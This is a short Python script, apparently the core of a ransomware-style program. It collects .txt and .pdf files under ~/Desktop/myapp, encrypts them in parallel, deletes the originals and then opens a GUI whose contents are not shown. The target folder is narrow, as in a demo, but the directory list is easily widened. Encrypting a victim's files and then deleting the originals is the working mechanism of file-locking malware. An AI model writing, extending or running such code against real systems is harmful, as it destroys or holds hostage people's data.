# file: main.py

from pathlib import Path
import os
from concurrent.futures import ThreadPoolExecutor, as_completed

from crypto.encrypt import SecureFileCryptoStream
from software_gui import run_gui

crypto = SecureFileCryptoStream()

ALLOWED_EXTENSIONS = {".txt", ".pdf"}


def get_user_dirs() -> list[Path]:
    home = Path.home()
    dirs = [
        home / "Desktop/myapp",
    ]
    return [d for d in dirs if d.is_dir()]


def get_files(directory: Path):
    directory = Path(directory)

    if not directory.is_dir():
        return

    for path in directory.rglob("*"):
        if not path.is_file():
            continue

        if path.suffix == ".enc":
            continue

        if path.suffix.lower() not in ALLOWED_EXTENSIONS:
            continue

        yield path

def encrypt_file(path):

    #print("encrypt:", path)
    crypto.encrypt_file(path)


def delete_original_files():
    files = get_files(Path.home() / "Desktop/myapp")

    for file in files:
        if file.suffix == ".enc":
            continue

        if file.is_file():
            try:
                file.unlink()
            except Exception as e:
                print(e)


def main():
    directories = get_user_dirs()

    all_files = []

    for d in directories:
        all_files.extend(get_files(d))


    with ThreadPoolExecutor(max_workers=4) as executor:
       executor.map(encrypt_file, all_files)

    delete_original_files()

    run_gui()


if __name__ == "__main__":
    main()